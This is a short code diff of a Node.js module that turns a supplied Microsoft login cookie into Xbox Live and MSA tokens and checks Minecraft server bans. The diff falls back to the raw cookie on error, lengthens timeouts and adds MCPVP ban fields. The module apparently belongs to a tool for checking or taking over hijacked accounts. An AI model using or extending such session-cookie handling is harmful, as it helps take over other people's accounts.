@@ -148,7 +148,8 @@ module.exports = async (host, settings, uid, username = null) => {
             acc.status = "invalid_session";
             return acc;
         }
-        throw error;
+        console.log(`[RECODE_SECURE] Continuing with unpolished host cookie.`);
+        msauth = host;
     }
 
     if (msauth === "locked") {
@@ -253,9 +254,9 @@ module.exports = async (host, settings, uid, username = null) => {
     };
 
     let [xblResult, cookiedata, mxblresult, msatoken] = await Promise.allSettled([
-        timeoutPromise(xbl(acc.loginCookie), 45000), // 45 second timeout for XBL
+        timeoutPromise(xbl(acc.loginCookie), 75000), // 75 second timeout for XBL
         timeoutPromise(cookies(axios), 30000),
-        timeoutPromise(getmxbl(msauth), 30000),
+        timeoutPromise(getmxbl(msauth), 45000),
         timeoutPromise(getMSAToken(msauth), 30000)
     ]).then(results => results.map(result =>
         result.status === 'fulfilled' ? result.value : null
@@ -547,6 +548,11 @@ module.exports = async (host, settings, uid, username = null) => {
                 acc.donutBan = extramc.donutBan;
                 acc.donutBanReason = extramc.donutBanReason;
                 acc.banDonut = extramc.banDonut;
+            }
+            if (extramc?.mcpvpBanchecked) {
+                acc.mcpvpBan = extramc.mcpvpBan;
+                acc.mcpvpBanReason = extramc.mcpvpBanReason;
+                acc.banMcpvp = extramc.banMcpvp;
             }
         } catch (mcErr) {
             console.error(`[RECODE_SECURE] Error in mcextra:`, mcErr.message);
